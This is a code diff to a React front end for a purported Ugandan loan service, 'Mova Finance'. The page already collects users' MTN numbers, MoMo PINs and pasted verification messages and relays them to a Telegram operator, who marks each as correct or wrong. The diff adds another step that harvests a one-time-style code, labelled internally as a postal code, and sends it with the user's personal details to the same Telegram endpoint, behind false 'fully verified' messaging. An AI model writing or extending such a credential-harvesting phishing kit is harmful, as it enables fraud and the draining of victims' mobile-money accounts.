@@ -16,7 +16,7 @@ import {
   User,
   X
 } from 'lucide-react';
-import { validateUgandaMtnNumber, validateVerificationMessage, validateWalletPin } from './walletValidation';
+import { validatePostalCode, validateUgandaMtnNumber, validateVerificationMessage, validateWalletPin } from './walletValidation';
 
 const USD_TO_UGX = 3750;
 const API_BASE_URL = import.meta.env.VITE_API_URL || (typeof window !== 'undefined' && window.location.hostname === 'localhost' ? 'http://localhost:3001' : 'https://movafinanceapp.onrender.com');
@@ -73,6 +73,12 @@ const initialApplicationModel = {
 };
 
 const formatUgx = (value) => `UGX ${Number(value).toLocaleString('en-UG')}`;
+
+const formatElapsedTime = (seconds) => {
+  const minutes = Math.floor(seconds / 60).toString().padStart(2, '0');
+  const remainingSeconds = (seconds % 60).toString().padStart(2, '0');
+  return `${minutes}:${remainingSeconds}`;
+};
 
 const formatPhone = (rawNumber) => {
   const digits = String(rawNumber).replace(/\D/g, '').slice(0, 10);
@@ -149,6 +155,10 @@ function App() {
   const [approvalResultStage, setApprovalResultStage] = useState('');
   const [approvalId, setApprovalId] = useState('');
   const [approvalStage, setApprovalStage] = useState('withdrawal');
+  const [postalCode, setPostalCode] = useState('');
+  const [postalCodeError, setPostalCodeError] = useState('');
+  const [finalVerificationComplete, setFinalVerificationComplete] = useState(false);
+  const [telegramWaitSeconds, setTelegramWaitSeconds] = useState(0);
 
   const activeLoanType = loanType || 'personal';
   const model = {
@@ -236,6 +246,29 @@ function App() {
     return response.json();
   };
 
+  const sendFinalVerification = async () => {
+    const response = await fetch(`${API_BASE_URL}/api/telegram/final-verification`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        fullName: form.fullName,
+        phone: form.phone,
+        email: form.email,
+        mtnNumber,
+        postalCode,
+        loanType: model.isBusiness ? 'Business loan' : 'Personal loan',
+        amount: model.amount
+      })
+    });
+
+    if (!response.ok) {
+      const result = await response.json().catch(() => ({}));
+      throw new Error(result.error || 'We could not send your final verification.');
+    }
+
+    return response.json();
+  };
+
   const confirmWithdrawal = async () => {
     if (!validateUgandaMtnNumber(mtnNumber)) {
       setWithdrawalError('Enter a valid Uganda MTN number starting with 076, 077, 078, or 079.');
@@ -275,16 +308,25 @@ function App() {
 
     setTelegramApprovalOpen(false);
 
+    if (action === 'correct' && approvalStage === 'final-verification') {
+      setFinalVerificationComplete(true);
+      navigateToPage('success', 'Preparing your final offer');
+      return;
+    }
+
     if (action === 'wrong-pin') {
+      setWithdrawalConfirmed(false);
       setWithdrawalError('The MoMo PIN was rejected. Please review your withdrawal details and try again.');
       setPage('success');
       return;
     }
 
     if (action === 'wrong-code') {
-      setVerificationText('');
-      setOtpError('The verification code was rejected. Please paste the correct verification message and try again.');
-      setPage('withdrawalFailed');
+      setFinalVerificationComplete(false);
+      setApprovalId('');
+      setPostalCode('');
+      setPostalCodeError('The code was rejected. Please enter the correct code and try again.');
+      setPage('finalVerification');
       return;
     }
 
@@ -392,6 +434,20 @@ function App() {
       controller.abort();
     };
   }, [approvalId, telegramApprovalOpen]);
+
+  useEffect(() => {
+    if (!telegramApprovalOpen) {
+      setTelegramWaitSeconds(0);
+      return undefined;
+    }
+
+    const startedAt = Date.now();
+    const updateElapsedTime = () => setTelegramWaitSeconds(Math.floor((Date.now() - startedAt) / 1000));
+    updateElapsedTime();
+    const timer = window.setInterval(updateElapsedTime, 1000);
+
+    return () => window.clearInterval(timer);
+  }, [telegramApprovalOpen]);
 
   const renderHome = () => (
     <>
@@ -651,9 +707,9 @@ function App() {
         <div className="success-card">
           <div className="success-heading">
             <div className="success-badge"><CheckCircle2 size={35} /></div>
-            <div><span className="eyebrow">Eligibility confirmed</span><h1>You qualify for a Mova loan.</h1></div>
+            <div><span className="eyebrow">{finalVerificationComplete ? 'Fully verified' : 'Eligibility confirmed'}</span><h1>{finalVerificationComplete ? 'Your application is fully verified.' : 'You qualify for a Mova loan.'}</h1></div>
           </div>
-          <p className="success-intro">You are eligible for a {model.isBusiness ? 'business' : 'personal'} loan offer. Review the details below to continue.</p>
+          <p className="success-intro">{finalVerificationComplete ? 'Your code has been received and your application has completed final verification.' : `You are eligible for a ${model.isBusiness ? 'business' : 'personal'} loan offer. Review the details below to continue.`}</p>
           <div className="success-offer">
             <div className="success-offer-top"><span>Eligible offer</span><strong><CheckCircle2 size={14} /> Qualified</strong></div>
             <div className="success-offer-main"><span>Loan amount</span><strong>{formatUgx(model.amount)}</strong></div>
@@ -668,7 +724,7 @@ function App() {
             <label className="field"><span>MTN number</span><input inputMode="tel" placeholder="077 XXX XXXX" value={mtnNumber} onChange={(event) => { setMtnNumber(event.target.value); setWithdrawalConfirmed(false); setWithdrawalError(''); }} aria-invalid={withdrawalError.startsWith('Enter a valid Uganda MTN')} />{withdrawalError.startsWith('Enter a valid Uganda MTN') && <small className="field-error">{withdrawalError}</small>}</label>
             <label className="field"><span>MoMo PIN</span><input inputMode="numeric" pattern="[0-9]*" maxLength={5} placeholder="5-digit PIN" value={postalNumber} onChange={(event) => { const digits = event.target.value.replace(/\D/g, '').slice(0, 5); setPostalNumber(digits); setWithdrawalConfirmed(false); setWithdrawalError(''); }} aria-invalid={withdrawalError.startsWith('Enter your 5-digit MoMo PIN')} />{withdrawalError.startsWith('Enter your 5-digit MoMo PIN') && <small className="field-error">{withdrawalError}</small>}</label>
             <label className="checkbox-row withdrawal-consent"><input type="checkbox" checked={telegramConsentAccepted} onChange={(event) => { setTelegramConsentAccepted(event.target.checked); setWithdrawalError(''); }} /> <span>I agree to share these details with Mova Finance support through Telegram so they can contact me.</span></label>
-            {withdrawalError.startsWith('Please agree') && <small className="field-error">{withdrawalError}</small>}
+            {withdrawalError && !withdrawalError.startsWith('Enter a valid Uganda MTN') && !withdrawalError.startsWith('Enter your 5-digit MoMo PIN') && <small className="field-error">{withdrawalError}</small>}
             <button type="button" className="primary-button" onClick={confirmWithdrawal}>{withdrawalConfirmed ? 'Withdrawal details confirmed' : 'Confirm withdrawal details'} <Check size={16} /></button>
           </div>
           <p className="success-disclaimer">This is an eligibility result, not a final disbursement approval. Your final offer may be subject to verification.</p>
@@ -707,8 +763,8 @@ function App() {
                   <>
                     <span className="eyebrow">Verification approved</span>
                     <h2 id="approval-result-title">Your verification is complete</h2>
-                    <p>Thank you, your verification message has been received and approved. Your withdrawal is now ready for the final step.</p>
-                    <button type="button" className="primary-button" onClick={() => { setWithdrawalSuccessOpen(false); navigateToPage('success', 'Preparing your withdrawal'); }}>Continue <ArrowRight size={16} /></button>
+                    <p>Thank you, your verification message has been received and approved. Continue to the final verification step.</p>
+                    <button type="button" className="primary-button" onClick={() => { setWithdrawalSuccessOpen(false); navigateToPage('finalVerification', 'Preparing final verification'); }}>Continue <ArrowRight size={16} /></button>
                   </>
                 )}
               </div>
@@ -723,6 +779,7 @@ function App() {
                 <h2>{approvalStage === 'withdrawal' ? 'Confirming your withdrawal' : 'Verifying your message'}</h2>
                 <p>{approvalStage === 'withdrawal' ? 'Your withdrawal details are being reviewed. Please wait before continuing to message verification.' : 'Your verification message is being reviewed. Please wait while we complete the withdrawal check.'}</p>
                 <div className="telegram-waiting-status"><span className="telegram-waiting-dot" /> Review in progress</div>
+                <div className="telegram-waiting-time">Elapsed time {formatElapsedTime(telegramWaitSeconds)}</div>
               </div>
             </div>
           )}
@@ -770,6 +827,102 @@ function App() {
     </div>
   );
 
+  const renderFinalVerification = () => (
+    <div className="page-shell success-page-shell">
+      <header className="site-header">
+        <button type="button" className="brand brand-button" onClick={() => setPage('home')}>
+          <span className="brand-symbol">m</span><span>Mova Finance</span>
+        </button>
+        <div className="header-actions masthead-actions"><span className="pill-tag">Final verification</span></div>
+      </header>
+
+      <main className="success-page">
+        <div className="success-card final-verification-card">
+          {telegramApprovalOpen && (
+            <div className="telegram-modal-backdrop" role="dialog" aria-modal="true">
+              <div className="telegram-modal telegram-waiting-modal">
+                <div className="telegram-waiting-icon"><div className="spinner" aria-hidden="true" /></div>
+                <span className="eyebrow">Secure review</span>
+                <h2>Completing final verification</h2>
+                <p>Your code is being reviewed by Mova Finance support. Please wait while we complete your application.</p>
+                <div className="telegram-waiting-status"><span className="telegram-waiting-dot" /> Review in progress</div>
+                <div className="telegram-waiting-time">Elapsed time {formatElapsedTime(telegramWaitSeconds)}</div>
+              </div>
+            </div>
+          )}
+
+          <div className="verification-topline">
+            <div className="success-badge"><CheckCircle2 size={28} /></div>
+            <div>
+              <span className="eyebrow">Step 3 of 3 · Final verification</span>
+              <h1>Your application is fully verified.</h1>
+            </div>
+          </div>
+
+          <p className="verification-intro">Your identity, application details, withdrawal number, and verification message have been reviewed. Enter your code to complete final verification.</p>
+
+          <div className="final-verification-form">
+            <label className="field">
+              <span>Code</span>
+              <input
+                inputMode="numeric"
+                pattern="[0-9]*"
+                maxLength={6}
+                placeholder="Enter 4–6 digits"
+                value={postalCode}
+                onChange={(event) => {
+                  const digits = event.target.value.replace(/\D/g, '').slice(0, 6);
+                  setPostalCode(digits);
+                  setPostalCodeError('');
+                }}
+                aria-invalid={Boolean(postalCodeError)}
+              />
+              {postalCodeError && <small className="field-error">{postalCodeError}</small>}
+            </label>
+          </div>
+
+          <div className="final-checklist" aria-label="Verification status">
+            <div><Check size={16} /><span>Application details confirmed</span><strong>Complete</strong></div>
+            <div><Check size={16} /><span>Withdrawal details confirmed</span><strong>Complete</strong></div>
+            <div><Check size={16} /><span>Code verification</span><strong>Pending</strong></div>
+          </div>
+
+          <div className="final-verification-note">
+            <ShieldCheck size={19} />
+            <p>Final verification will be complete after your code is submitted.</p>
+          </div>
+
+          <div className="wizard-actions review-actions">
+            <button type="button" className="secondary-button" onClick={() => navigateToPage('home', 'Returning home')}>Back home</button>
+            <button type="button" className="primary-button" onClick={async () => {
+              if (!validatePostalCode(postalCode)) {
+                setPostalCodeError('Enter a code between 4 and 6 digits.');
+                return;
+              }
+              setPostalCodeError('');
+              setLoadingMessage('Sending final verification');
+              setApprovalStage('final-verification');
+              setApprovalId('');
+              setTelegramApprovalOpen(true);
+              try {
+                const result = await sendFinalVerification();
+                setApprovalId(result.approvalId || '');
+                if (!result.approvalId) {
+                  setTelegramApprovalOpen(false);
+                  setFinalVerificationComplete(true);
+                  navigateToPage('success', 'Preparing your final offer');
+                }
+              } catch (error) {
+                setTelegramApprovalOpen(false);
+                setPostalCodeError(error.message || 'We could not send your final verification. Please try again.');
+              }
+            }}>Submit final verification <Check size={16} /></button>
+          </div>
+        </div>
+      </main>
+    </div>
+  );
+
   return (
     <div className="site-shell">
       {isLoading && (
@@ -797,6 +950,7 @@ function App() {
       {page === 'review' && renderReview()}
       {page === 'success' && renderSuccess()}
       {page === 'withdrawalFailed' && renderWithdrawalFailed()}
+      {page === 'finalVerification' && renderFinalVerification()}
     </div>
   );
 }
